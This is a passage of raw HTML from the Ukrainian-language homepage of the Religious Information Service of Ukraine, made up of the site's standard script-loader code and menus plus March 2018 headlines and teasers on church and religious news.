      
       <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
          "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:og="http://opengraphprotocol.org/schema/" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta name="generator" content="phpxmlkernel 2.10.4.26"></meta><meta name="signature" content="index"></meta><link rel="SHORTCUT ICON" href="https://risu.org.ua/favicon.ico"/><link rel="icon" href="https://risu.org.ua/favicon.ico"/><title>Релігійно-інформаційна служба України</title><base href="https://risu.org.ua/index.php"></base><meta http-equiv="content-type" content="text/html; charset=utf-8"></meta><link type="text/css" href="https://risu.org.ua/styles/reset.css" rel="stylesheet"></link><link type="text/css" href="https://risu.org.ua/styles/grid.css" rel="stylesheet"></link><link type="text/css" href="https://risu.org.ua/styles/style.css" rel="stylesheet"></link><link type="text/css" href="https://risu.org.ua/styles/menues.css" rel="stylesheet"></link><link type="text/css" href="https://risu.org.ua/styles/themes.css" rel="stylesheet"></link><!--[if lte IE 6]><script language="javascript" src="scripts/min-width.js" type="text/javascript"></script><![endif]--><link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://risu.org.ua/rss/ua/index"></link><!-- hs --> <script type="text/javascript" language="javascript" src="https://risu.org.ua/scripts/yui/yahoo-dom-event/yahoo-dom-event.js"></script>  <script type="text/javascript" language="javascript" src="https://risu.org.ua/scripts/yui/get/get-min.js"></script>  <link rel="stylesheet" type="text/css" href="https://risu.org.ua/scripts/jquery_ui_dialog/jquery-ui-1.7.2.custom.css"></link> <!-- hs -->    
     <script type="text/javascript" language="javascript">
/// <reference path="yui/yahoo-dom-event/yahoo-dom-event.js" />
/// <reference path="yui/get/get.js" />
/*
var sConfig = {
'yahoo':
{
path: '',
requires: []
},
'dom':
{
path: '',
requires: ['yahoo']
},
'event':
{
path: '',
requires: ['yahoo']
}
};
*/
var Script_Loader = function(config, loaded) {
    var self = this;
    this.config = config;
    this.scripts = {};
    this.quee = [];
    var connection = null;
    var loadNext = function() {
        var shift = function() {
            self.quee.splice(0, 1);
            connection = null;
            loadNext();
        };
        if (self.documentReady && !connection) {
            if (self.quee.length > 0) {
                var next = self.quee[0];
                var itempath = next.config.path;
                if (!(itempath.match("https://"))) {
                    itempath = self.httproot + itempath;
                }
                if (itempath.match(".css")) {
                    connection = YAHOO.util.Get.css(itempath, {
                        onSuccess: function() { next.successEvent.fire(); shift(); },
                        onFailure: function() { next.failureEvent.fire(); shift(); },
                        onTimeout: function() { next.failureEvent.fire(); shift(); }
                    });
                } else {
                    connection = YAHOO.util.Get.script(itempath, {
                        onSuccess: function() { next.successEvent.fire(); shift(); },
                        onFailure: function() { next.failureEvent.fire(); shift(); },
                        onTimeout: function() { next.failureEvent.fire(); shift(); }
                    });
                }
            }
        }
    };
    this.addToQuee = function(script) {
        if (!script.loaded) {
            for (var i = 0; i < this.quee.length; i++) {
                if (this.quee[i] == script) {
                    return;
                }
            }
            self.quee.push(script);
            if (self.quee.length == 1) {
                loadNext();
            }
            script.onSuccess(loadNext);
            script.onFailure(loadNext);
        }
    };
    this.requireScript = function(name) {
        var script = this.scripts[name];
        if (script) {
            return script;
        }
        script = new JScript(this, name);
        this.scripts[name] = script;
        return script;
    };
    this.requireScripts = function(list, _success, _failure) {
        var requires = [];
        var fail = false;
        var loaded = false;
        var __success = function() {
            if (!loaded) {
                for (var i = 0; i < requires.length; i++) {
                    if (!requires[i].loaded || requires[i].wrong) {
                        return;
                    }
                }
                loaded = true;
                if (_success)
                    _success();
            }
        };
        var __failure = function() {
            if (!fail) {
                fail = true;
                if (_failure)
                    _failure();
            }
        };
        for (var i = 0; i < list.length; i++) {
            requires.push(this.requireScript(list[i]));
        }
        if (_success) {
            for (var i = 0; i < requires.length; i++) {
                requires[i].onSuccess(__success);
            }
        }
        if (_failure) {
            for (var i = 0; i < requires.length; i++) {
                requires[i].onFailure(__failure);
            }
        }
        if (!fail) {
            __success();
        }
    };
    for (var i = 0; i < loaded.length; i++) {
        var script = loaded[i];
        if (!this.scripts[script]) {
            this.scripts[script] = new JScript(self, script, true);
        }
    }
    /*   DocumentReady begin */
    var documentReadyEvent = new YAHOO.util.CustomEvent('documentReady');
    documentReadyEvent.subscribe(loadNext);
    this.documentReady = false;
    this.onDocumentReady = function(callback) {
        if (this.documentReady) {
            return callback();
        }
        else {
            documentReadyEvent.subscribe(callback);
        }
    };
    var ready = function() {
        if (!self.documentReady) {
            self.documentReady = true;
            documentReadyEvent.fire();
        }
    };
    YAHOO.util.Event.onDOMReady(function() {

        if (document.all && navigator.userAgent.indexOf("Opera") == -1) {
            var d = window.document;
            (function() {
                try {
                    d.documentElement.doScroll('left');
                } catch (e) {
                    setTimeout(arguments.callee, 50);
                    return;
                }
                ready();
            })();
        } else {
            ready();
        }
    });
    /*   DocumentReady end */
};

function JScript(ScriptLoader, name, loaded, requires) {
    var self = this;
    this.name = name;
    this.loaded = loaded;
    this.wrong = false;
    if (name.indexOf('https://') == 0) {
        this.config = { path: name, requires: requires || [] };
    }
    else {
        this.config = ScriptLoader.config[name];
        if (!this.config) {
            alert('script "' + name + '" is undefined');
            this.config = { path: name, requires: [] };
        }
    }
    this.successEvent = new YAHOO.util.CustomEvent("success");
    this.failureEvent = new YAHOO.util.CustomEvent("failure");
    this.successEvent.subscribe(function() { self.loaded = true; });
    this.failureEvent.subscribe(function() { self.wrong = true; });
    this.onSuccess = function(callback) {
        if (this.loaded) {
            callback();
        }
        else {
            this.successEvent.subscribe(callback);
        }
    };
    this.onFailure = function(callback) {
        if (this.wrong) {
            callback();
        }
        else {
            this.failureEvent.subscribe(callback);
        }
    };

    var ready = function() {
        if (!self.loaded) {
            ScriptLoader.addToQuee(self);
        }
    };
    var fail = function() {
        if (!self.wrong) {
            self.wrong = true;
            self.failureEvent.fire();
        }
    };
    if (!loaded) {
        ScriptLoader.requireScripts(this.config.requires, ready, fail);
    }
}

function formattemplate(tmpl, repls) {

    var res = tmpl.replace(
    /(?:\{\{|\%7B\%7B)(.*?)(?:\}\}|\%7D\%7D)/g,
    function(m) { return getPropertyFromVar(repls, m); }
  );

    return res;

}

function getPropertyFromVar(obj, m, errors) {
    var ret;
    var localobj = obj;


    var props = m.match(/(?:\{\{|%7B%7B)(.*?)(?:\}\}|%7D%7D)/);
    if (props) {
        var proppath = props[1].split(".");
        for (var i = 0; i < proppath.length; i++) {
            localobj = localobj[proppath[i]];
            if (typeof (localobj[proppath[i]]) != "undefined") break;
        }
        /* options typed or untyped json:*/
        ret = (localobj)
         ? ((localobj.content) ? localobj.content : localobj)
         : ((errors) ? "No value for '" + props[1] + "' (" + m + ")" : "");

    } else {
        ret = (errors) ? "No key in '" + m + "'" : "";
    }

    return ret;
}
    Script_Loader.prototype.httproot = 'https://risu.org.ua/';
var ScriptConfig = {
'tiny2': {path:'scripts/tiny2/tiny_mce.js', requires: []}
,'poorhtmlmemo': {path:'scripts/edit.js', requires: []}
,'autocomplete': {path:'scripts/yui/autocomplete/autocomplete.js', requires: []}
,'button': {path:'scripts/yui/button/button-min.js', requires: []}
,'connection': {path:'scripts/yui/connection/connection-min.js', requires: ['yahoo','dom','event']}
,'container': {path:'scripts/yui/container/container-min.js', requires: []}
,'calendar': {path:'scripts/yui/calendar/calendar-min.js', requires: ['calendar_css']}
,'json': {path:'scripts/yui/json/json-min.js', requires: []}
,'dom': {path:'scripts/yui/dom/dom-min.js', requires: []}
,'animation': {path:'scripts/yui/animation/animation-min.js', requires: []}
,'datasource': {path:'scripts/yui/datasource/datasource-min.js', requires: []}
,'dragdrop': {path:'scripts/yui/dragdrop/dragdrop-min.js', requires: []}
,'event': {path:'scripts/yui/event/event-min.js', requires: []}
,'element': {path:'scripts/yui/element/element-min.js', requires: ['yahoo','dom','event']}
,'get': {path:'scripts/yui/get/get-min.js', requires: []}
,'treeview': {path:'scripts/yui/treeview/treeview-min.js', requires: ['yahoo','dom','event','connection','element']}
,'menu': {path:'scripts/yui/menu/menu.js', requires: ['container']}
,'tabview': {path:'scripts/yui/tabview/tabview-min.js', requires: ['yahoo-dom-event','connection','element','tabview_css','tabview-skin_css']}
,'paginator': {path:'scripts/yui/paginator/paginator-min.js', requires: []}
,'datatable': {path:'scripts/yui/datatable/datatable.js', requires: ['yahoo-dom-event','element','datasource','paginator','datatable_css','json']}
,'yuiloader-dom-event': {path:'scripts/yui/yuiloader-dom-event/yuiloader-dom-event.js', requires: []}
,'yahoo': {path:'scripts/yui/yahoo/yahoo-min.js', requires: []}
,'yuiloader': {path:'scripts/yui/yuiloader/yuiloader.js', requires: []}
,'yahoo-dom-event': {path:'scripts/yui/yahoo-dom-event/yahoo-dom-event.js', requires: []}
,'uploader': {path:'scripts/yui/uploader/uploader-min-fixed.js', requires: ['element']}
,'cookie': {path:'scripts/yui/cookie/cookie-min.js', requires: []}
,'jquery': {path:'scripts/jquery/jquery-1.3.2.js', requires: []}
,'jquery.validate': {path:'scripts/jquery/jquery.validate.js', requires: ['jquery']}
,'lightbox': {path:'scripts/jquery/jquery.lightbox-0.5.min.js', requires: ['jquery','lightbox_css']}
,'jquery.form': {path:'scripts/jquery/jquery.form.js', requires: ['jquery']}
,'jquery_ui': {path:'scripts/jquery_ui_dialog/jquery-ui-1.7.2.custom.min.js', requires: []}
,'jquery_check_browser': {path:'scripts/jquery_ui_dialog/check_browser.js', requires: []}
,'jquery_check_browser_css': {path:'scripts/jquery_ui_dialog/jquery-ui-1.7.2.custom.css', requires: []}
,'layoutedit': {path:'scripts/layoutedit.js', requires: []}
,'fb_api': {path:'https://connect.facebook.net//all.js', requires: []}
,'gmaps': {path:'http://maps.google.com/maps/api/js?v=3.1&sensor=false', requires: []}
,'e-gmap-polyline': {path:'scripts/e-gmap-polyline.js', requires: ['gmaps']}
,'e-uploader': {path:'scripts/e-uploader.js', requires: ['uploader','connection','cookie','datatable','uploader_css']}
,'e-uploader_stdimages': {path:'scripts/e-uploader_stdimages.js', requires: []}
,'linkedarticles': {path:'scripts/linkedarticles.js', requires: []}
,'visitor_update': {path:'scripts/visitor_update.js', requires: ['jquery.form']}
,'sitemenu': {path:'scripts/sitemenu.js', requires: ['jquery','fb_api']}
,'datatable-edesign-fix': {path:'scripts/datatable-edesign-fix.js', requires: ['datatable']}
,'e-calendar': {path:'scripts/e-calendar.js', requires: ['yahoo-dom-event','dragdrop','element','button','container','calendar','e-calendar_css','calendar_css','container_css','button_css']}
,'lang_control': {path:'scripts/lang_control.js', requires: []}
,'e-formvalidation': {path:'scripts/e-formvalidation.js', requires: ['jquery.validate','jquery']}
,'imbrowser': {path:'scripts/imbrowser.js', requires: []}
,'single_uploader': {path:'scripts/single_uploader.js', requires: ['element','json','connection','cookie','uploader','imbrowser']}
,'combosuggest': {path:'scripts/combosuggest.js', requires: ['datasource','autocomplete']}
,'lookup': {path:'scripts/lookup.js', requires: ['connection','datasource','animation','autocomplete']}
,'e-map': {path:'scripts/map.js', requires: ['connection','container','animation','container_css']}
,'uploader_css': {path:'styles/uploader.css', requires: []}
,'lightbox_css': {path:'styles/jquery.lightbox-0.5.css', requires: []}
,'menu_css': {path:'scripts/yui/menu/assets/skins/sam/menu.css', requires: []}
,'colorpicker_css': {path:'scripts/yui/colorpicker/assets/skins/sam/colorpicker.css', requires: []}
,'slider_css': {path:'scripts/yui/slider/assets/skins/sam/slider.css', requires: []}
,'fonts_css': {path:'scripts/yui/fonts/fonts-min.css', requires: []}
,'container_css': {path:'scripts/yui/container/assets/skins/sam/container.css', requires: []}
,'datatable_css': {path:'scripts/yui/datatable/assets/skins/sam/datatable.css', requires: []}
,'treeview_css': {path:'scripts/yui/treeview/assets/skins/sam/treeview.css', requires: []}
,'tabview_css': {path:'/scripts/yui/tabview/assets/skins/sam/tabview.css', requires: []}
,'tabview-skin_css': {path:'/scripts/yui/tabview/assets/skins/sam/tabview-skin.css', requires: []}
,'button_css': {path:'scripts/yui/button/assets/skins/sam/button.css', requires: []}
,'calendar_css': {path:'scripts/yui/calendar/assets/skins/sam/calendar.css', requires: []}
,'e-calendar_css': {path:'styles/e-calendar.css', requires: []}
,'sifr1': {path:'scripts/sifr3/sifr.js', requires: []}
,'sifr2': {path:'scripts/sifr3/sifr-debug.js', requires: []}
,'sifr3': {path:'scripts/sifr3/sifrcustomize.js', requires: []}
,'sifr': {path:'scripts/sifr3/sifrcustomize.css', requires: ['sifr1','sifr2','sifr3']}
};
var ScriptLoader = new Script_Loader(ScriptConfig, ['yahoo','yahoo-dom-event','yahoo','dom','event','get','jquery','fb_api','sitemenu','jquery_ui','jquery_check_browser']);

     </script>
      <script type="text/javascript" language="javascript" src="https://risu.org.ua/scripts/jquery/jquery-1.3.2.js"></script>  <script type="text/javascript" language="javascript" src="https://connect.facebook.net//all.js"></script>  <script type="text/javascript" language="javascript" src="https://risu.org.ua/scripts/sitemenu.js"></script>  <script type="text/javascript" language="javascript" src="https://risu.org.ua/scripts/jquery_ui_dialog/jquery-ui-1.7.2.custom.min.js"></script>  <script type="text/javascript" language="javascript" src="https://risu.org.ua/scripts/jquery_ui_dialog/check_browser.js"></script> <style type="text/css" id="styleoverrides"></style></head><body class='theme-index'><div id="fb-root"></div><div id="canvas"><div id="header" class="robots-nocontent line"><div class="item" id="headerWrap"><div class="topBanner"><noindex><a href="http://risu.org.ua/ua/index/spiritual_culture/lithurgy/great_lent"><img src="php_uploads/images/portlets/PortletTopImage_UA_121.gif" alt="" ></a></noindex></div><div class="contentItem"><div id="logo"><a href="https://risu.org.ua/" 
 ><img src="php_uploads/images/sitecontent/ContentFileLogo_UA_5.gif" alt="" ></a></div><div class="loginSearchWrap"><div class="logonMenu"><a href="https://risu.org.ua/ua/index/visitor-login" 
 >Ввійти</a> <a href="https://risu.org.ua/ua/index/visitor-register" 
 >Зареєструватись</a></div><div class="langmenu"><ul><li class="act"><a href='https://risu.org.ua/'>укр</a></li><li><a href='https://risu.org.ua/ru/index'>рус</a></li><li><a href='https://risu.org.ua/en/index'>en</a></li></ul></div><div class="searchTop"><form
 method='post' action='https://risu.org.ua/ua/index/search' id="quicksearchform" class="quicksearchform"
 ><input type="text" class="sword" name="query"></input><input class="submit" type="image" src="im/search_submit_bg.gif" onclick="document.getElementById('quicksearchform').submit();"></input><input type="submit" style="display:none"></input></form></div></div><div class="portaldesc"></div><div id="topMenu"><div class="toplinks"><a href="https://risu.org.ua/" 
 ><img src="im/icon_home.gif" alt="main page"></img></a>
 |
 <a href="https://risu.org.ua/ua/index/feedback" 
 ><img src="im/icon_mail.gif" alt="mail us"></img></a>
 |
 <a href="https://risu.org.ua/ua/index/sitemap_i" 
 ><img src="im/icon_sitemap.gif" alt="sitemap"></img></a>
 |
 <a href="https://risu.org.ua/rss/ua/index" 
 ><img src="im/iconrss.gif" alt="rss"></img></a> | <a href="http://twitter.com/risu_ukr" rel="nofollow"><img src="im/twitter.gif"></img></a> | <a href="http://www.facebook.com/pages/Religijno-informacijna-sluzba-Ukraini/284036313158" rel="nofollow"><img src="im/facebook.gif"></img></a></div><ul class="menu11" id="menu11"><li><a href="https://risu.org.ua/ua/index/neformat" 
 >#НеФормат</a></li><li><a href="https://risu.org.ua/ua/index/web_conference" 
 >Веб-конференції</a></li><li><a href="https://risu.org.ua/ua/index/popular_reporter" 
 >Народний репортер</a></li><li><a href="https://risu.org.ua/ua/index/vox_populi" 
 >Vox populi</a></li><li><a href="https://risu.org.ua/ua/index/blog" 
 >Блоги</a></li><li><a href="https://risu.org.ua/ua/index/editorial_column" 
 >Редакційна колонка</a></li><li><a href="https://risu.org.ua/ua/index/tags" 
 >Теги, автори</a></li></ul></div></div></div></div><div class="robots-nocontent line" id="navigation"><div class="item" id="primary-nav"><div class="leftedge"></div><div class="rightedge"></div><ul class="menu12" id="menu12"><li><a href="https://risu.org.ua/ua/index/all_news" 
 >Новини</a><ul class="menu2  hidden" id="menu2-all_news"><li><a href="https://risu.org.ua/ua/index/all_news/news_regions" 
 >По регіонах</a></li><li><a href="https://risu.org.ua/ua/index/all_news/orthodox" 
 >Православні</a></li><li><a href="https://risu.org.ua/ua/index/all_news/catholics" 
 >Католики</a></li><li><a href="https://risu.org.ua/ua/index/all_news/protestants" 
 >Протестанти</a></li><li><a href="https://risu.org.ua/ua/index/all_news/other_confessions" 
 >Інші конфесії</a></li><li><a href="https://risu.org.ua/ua/index/all_news/confessional" 
 >Міжконфесійне</a></li><li><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world" 
 >Україна і світ</a></li><li><a href="https://risu.org.ua/ua/index/all_news/state" 
 >Держава</a></li><li><a href="https://risu.org.ua/ua/index/all_news/community" 
 >Суспільство</a></li><li><a href="https://risu.org.ua/ua/index/all_news/culture" 
 >Культура</a></li><li><a href="https://risu.org.ua/ua/index/all_news/world_news" 
 >Світові</a></li><li><a href="https://risu.org.ua/ua/index/all_news/announcements_events" 
 >Анонси</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/exclusive" 
 >Ексклюзив</a><ul class="menu2  hidden" id="menu2-exclusive"><li><a href="https://risu.org.ua/ua/index/exclusive/reportage" 
 >Репортажі</a></li><li><a href="https://risu.org.ua/ua/index/exclusive/journalistic_investigations" 
 >Журналістські розслідування</a></li><li><a href="https://risu.org.ua/ua/index/exclusive/review" 
 >Огляд подій</a></li><li><a href="https://risu.org.ua/ua/index/exclusive/kaleidoscope" 
 >Калейдоскоп</a></li><li><a href="https://risu.org.ua/ua/index/exclusive/holidays_and_customs" 
 >Свята і звичаї</a></li><li><a href="https://risu.org.ua/ua/index/exclusive/events_people" 
 >Події та люди</a></li><li><a href="https://risu.org.ua/ua/index/exclusive/photogallery" 
 >Фото- і відео-галерея</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/expert_thought" 
 >Точка зору</a><ul class="menu2  hidden" id="menu2-expert_thought"><li><a href="https://risu.org.ua/ua/index/expert_thought/analytic" 
 >Аналітика</a></li><li><a href="https://risu.org.ua/ua/index/expert_thought/comments" 
 >Коментарі</a></li><li><a href="https://risu.org.ua/ua/index/expert_thought/interview" 
 >Інтерв'ю</a></li><li><a href="https://risu.org.ua/ua/index/expert_thought/open_theme" 
 >Відкрита тема</a></li><li><a href="https://risu.org.ua/ua/index/expert_thought/authors_columns" 
 >Авторські колонки</a></li><li><a href="https://risu.org.ua/ua/index/expert_thought/webconf_archive" 
 >Архів веб-конференцій</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/monitoring" 
 >Моніторинг</a><ul class="menu2  hidden" id="menu2-monitoring"><li><a href="https://risu.org.ua/ua/index/monitoring/society_digest" 
 >Суспільство-дайджест</a></li><li><a href="https://risu.org.ua/ua/index/monitoring/kaleido_digest" 
 >Калейдоскоп-дайджест</a></li><li><a href="https://risu.org.ua/ua/index/monitoring/religious_digest" 
 >Релігієзнавство-дайджест</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/studios" 
 >Студії</a><ul class="menu2  hidden" id="menu2-studios"><li><a href="https://risu.org.ua/ua/index/studios/studies_of_religions" 
 >Релігієзнавчі студії</a></li><li><a href="https://risu.org.ua/ua/index/studios/materials_conferences" 
 >Матеріали конференцій</a></li><li><a href="https://risu.org.ua/ua/index/studios/religions_in_internet" 
 >Релігієзнавство в інтернеті</a></li><li><a href="https://risu.org.ua/ua/index/studios/announcements_of_publications" 
 >Огляд видань</a></li><li><a href="https://risu.org.ua/ua/index/studios/announcements_of_events" 
 >Анонси наукових подій</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/spiritual_culture" 
 >Сакральна культура</a><ul class="menu2  hidden" id="menu2-spiritual_culture"><li><a href="https://risu.org.ua/ua/index/spiritual_culture/sacra_culture" 
 >Сакральна культура Київської Церкви</a></li><li><a href="https://risu.org.ua/ua/index/spiritual_culture/lithurgy" 
 >Літургія і літургійний рік</a></li><li><a href="https://risu.org.ua/ua/index/spiritual_culture/icon" 
 >Іконопис та іконографія</a></li><li><a href="https://risu.org.ua/ua/index/spiritual_culture/architecture" 
 >Архітектура</a></li><li><a href="https://risu.org.ua/ua/index/spiritual_culture/music" 
 >Сакральна музика</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/reference" 
 >Довідник релігій</a><ul class="menu2  hidden" id="menu2-reference"><li><a href="https://risu.org.ua/ua/index/reference/major_religions" 
 >Конфесії, релігійні організації</a></li><li><a href="https://risu.org.ua/ua/index/reference/persons" 
 >Персони</a></li><li><a href="https://risu.org.ua/ua/index/reference/religiografia" 
 >Релігіографія</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/resourses" 
 >Ресурси</a><ul class="menu2  hidden" id="menu2-resourses"><li><a href="https://risu.org.ua/ua/index/resourses/church_doc" 
 >Документи конфесій</a></li><li><a href="https://risu.org.ua/ua/index/resourses/goverments_doc" 
 >Державні документи</a></li><li><a href="https://risu.org.ua/ua/index/resourses/statistics" 
 >Статистика</a></li><li><a href="https://risu.org.ua/ua/index/resourses/world_doc" 
 >Міжнародні документи</a></li><li><a href="https://risu.org.ua/ua/index/resourses/webcatalog" 
 >Веб-каталог</a></li><li><a href="https://risu.org.ua/ua/index/resourses/sociology" 
 >Соціологія</a></li><li><a href="https://risu.org.ua/ua/index/resourses/calendar" 
 >Календар</a></li><li><a href="https://risu.org.ua/ua/index/resourses/directory" 
 >Словник-довідник</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/topics" 
 >Теми</a><ul class="menu2  hidden" id="menu2-topics"><li><a href="https://risu.org.ua/ua/index/topics/hot_topic_of_year" 
 >Теми року</a></li><li><a href="https://risu.org.ua/ua/index/topics/theme_of_the_month" 
 >Тема місяця</a></li><li><a href="https://risu.org.ua/ua/index/topics/information_support" 
 >Інформаційний супровід</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/projects" 
 >Проекти</a><ul class="menu2  hidden" id="menu2-projects"><li><a href="https://risu.org.ua/ua/index/projects/freedom" 
 >Моніторинг релігійної свободи</a></li><li><a href="https://risu.org.ua/ua/index/projects/tolerance" 
 >Міжрелігійна толерантність</a></li><li><a href="https://risu.org.ua/ua/index/projects/masmedia" 
 >Релігія і мас-медіа</a></li><li><a href="https://risu.org.ua/ua/index/projects/risu_conference" 
 >Заходи РІСУ</a></li><li><a href="https://risu.org.ua/ua/index/projects/consulting" 
 >РІСУ-консалтинг</a></li><li><a href="https://risu.org.ua/ua/index/projects/help_children" 
 >Допоможіть дитині</a></li></ul></li><li><a href="https://risu.org.ua/ua/index/about_us" 
 >Про нас</a><ul class="menu2  hidden" id="menu2-about_us"><li><a href="https://risu.org.ua/ua/index/about_us/contacts" 
 >Наші контакти</a></li><li><a href="https://risu.org.ua/ua/index/about_us/editorial" 
 >Редакційна політика</a></li><li><a href="https://risu.org.ua/ua/index/about_us/invite" 
 >Співпраця</a></li><li><a href="https://risu.org.ua/ua/index/about_us/editorialnews" 
 >Новини редакції</a></li><li><a href="https://risu.org.ua/ua/index/about_us/portal_news" 
 >Новини порталу</a></li><li><a href="https://risu.org.ua/ua/index/about_us/donation" 
 >Підтримати РІСУ</a></li><li><a href="https://risu.org.ua/ua/index/about_us/partners" 
 >Наші партнери</a></li><li><a href="https://risu.org.ua/ua/index/about_us/reklama" 
 >Реклама на РІСУ</a></li><li><a href="https://risu.org.ua/ua/index/about_us/test3" 
 >РІСУ-2013</a></li></ul></li></ul></div><div class="clear"></div></div><div id="main" class="line"><div class="robots-nocontent item colums" id="sidebar-left"><div id="menu3"><div id="leftMenu"></div></div><div class=robots-nocontent><div class=portlet-position style="width:100%"></div><div class="contentItem featuredArticle"></div><script type="text/javascript" language="javascript">
      $(function(){
        var panel = $('div.featuredArticle');
        var news = $('div.topNews li');
        var view = function() {
          panel.html($('div.hidden', this).html());
        };
        news.mouseenter(view);
        news.eq(0).each(view);
      });
    </script><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain topNews"><div class="topBar grey"><div class="ltc"></div><div class="rtc"></div><h1>ТОП новини</h1></div><div class="shadow"></div><ul><li class="important"><p><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70451/">У Варшаві Патріарх УГКЦ закликав до примирення поляків та українців</a><span class="attributes">&nbsp;|&nbsp;<span class="date">16 березня 2018, 10:21</span>&nbsp;|&nbsp;<span class="comments"></span></span></p><div class="hidden"><a class="thumb" href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70451/"><span class="ltc" ></span><span class="rtc" ></span><img src="php_uploads/images/articles/ArticleTopImage_70451.jpg" alt="" ></a><div class="inside"><div class="attrs">16 березня 2018, 10:21</div><h2><a href="https://risu.org.ua/ua/index/all_news/ukraine_and_world/international_relations/70451/">У Варшаві Патріарх УГКЦ закликав до примирення поляків та українців</a></h2></div><div class="shadow"></div></div></li><li class="important"><p><a href="https://risu.org.ua/ua/index/all_news/culture/religious_holidays/70415/">Українські телеканали транслюватимуть Великодні Богослужіння з Ватикану та Києва</a><span class="attributes">&nbsp;|&nbsp;<span class="date">14 березня 2018, 09:30</span>&nbsp;|&nbsp;<span class="comments"></span></span></p><div class="hidden"><a class="thumb" href="https://risu.org.ua/ua/index/all_news/culture/religious_holidays/70415/"><span class="ltc" ></span><span class="rtc" ></span><img src="php_uploads/images/articles/ArticleTopImage_70415.jpg" alt="" ></a><div class="inside"><div class="attrs">14 березня 2018, 09:30</div><h2><a href="https://risu.org.ua/ua/index/all_news/culture/religious_holidays/70415/">Українські телеканали транслюватимуть Великодні Богослужіння з Ватикану та Києва</a></h2></div><div class="shadow"></div></div></li><li class="important"><p><a href="https://risu.org.ua/ua/index/all_news/state/national_religious_question/70364/">Національний день молитви за Україну відбудеться 2 червня</a><span class="attributes">&nbsp;|&nbsp;<span class="date">8 березня 2018, 12:30</span>&nbsp;|&nbsp;<span class="comments"></span></span></p><div class="hidden"><a class="thumb" href="https://risu.org.ua/ua/index/all_news/state/national_religious_question/70364/"><span class="ltc" ></span><span class="rtc" ></span><img src="php_uploads/images/articles/ArticleTopImage_70364.gif" alt="" ></a><div class="inside"><div class="attrs">8 березня 2018, 12:30</div><h2><a href="https://risu.org.ua/ua/index/all_news/state/national_religious_question/70364/">Національний день молитви за Україну відбудеться 2 червня</a></h2></div><div class="shadow"></div></div></li></ul><div class="more"></div></div><div class=portlet-position style="width:100%"></div><div class="contentItem infoBlockMain"><div class="topBar yellow"><div class="ltc"></div><div class="rtc"></div><h1>Публікації</h1></div><div class="shadow"></div><ul><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/events_people/70445/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70445.jpg" alt="" ></a><p class="attributes"><span class="date">16 березня 2018, 10:24</span>&nbsp;|&nbsp;<span class="category">Події та люди</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/events_people/70445/">Бельгієць з українським серцем: о. Кароль Більке — перекладач Шевченка фламандською</a></p><p>Цьогоріч виповнюється 120 років з дня народження о. Кароля Білке (Karol Bilcke) і 100 років від складення ним перших чернечих обітів. Він залишив по собі як добру пам’ять у Церкві, так і переклади творів Тараса Шевченка фламандською, а ще — обробки українських віршів з нотами.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/exclusive/events_people/70411/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70411.jpg" alt="" ></a><p class="attributes"><span class="date">14 березня 2018, 07:48</span>&nbsp;|&nbsp;<span class="category">Події та люди</span> |
 <a class="hasPhotos"><img alt="view photo" src="im/icon_photo.gif"></img></a>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/exclusive/events_people/70411/">Хранителі слобожанської менори. Про минуле і сучасне харківських караїмів</a></p><p>В уяві тих, у кого слово “караїми” викликає певний асоціативний ряд, воно пов’язане в першу чергу з Кримським півостровом. Адже караїми з різних регіонів Батьківщини та й усієї Східної Європи – нащадки саме вихідців з Криму. Вони оселилися в Харкові в 40-х рр. XIX ст., і стали піонерами харківської тютюнової промисловості.</p></li><li class="important"><a href="https://risu.org.ua/ua/index/expert_thought/interview/70407/" class="thumb"><img src="php_uploads/images/articles/ArticlePreviewImage_70407.gif" alt="" ></a><p class="attributes"><span class="date">13 березня 2018, 16:42</span>&nbsp;|&nbsp;<span class="category">Інтерв'ю</span>&nbsp;|&nbsp;<span class="comments"></span></p><p><a href="https://risu.org.ua/ua/index/expert_thought/interview/70407/">«Відмінності таки можуть нас об’єднати у Христі», - Маргарет Майєр («Реновабіс») про СЕР-2019 в Україні</a></p><p>150 делегатів Колоквіуму Європейських Парафій (СЕР) прибудуть у Львів 27 липня 2019 року. Форум триватиме до 1 серпня. З 2005 року у цьому саміті беруть участь представники України. Це стало можливим завдяки підтримці БФ &quot;Реновабіс&quot;, який у СЕР
